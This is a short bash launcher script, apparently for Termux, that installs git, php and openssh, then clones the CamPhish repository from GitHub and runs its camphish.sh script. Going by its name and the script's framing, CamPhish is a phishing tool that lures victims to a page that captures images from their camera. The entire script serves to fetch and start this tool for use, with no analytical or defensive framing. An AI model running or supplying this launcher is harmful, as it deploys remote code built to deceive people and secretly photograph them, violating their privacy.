#!/bin/bash
clear
echo "[*] Starting CamPhish..." | lolcat
pkg install git php openssh -y
git clone https://github.com/techchipnet/CamPhish.git
cd CamPhish
bash camphish.sh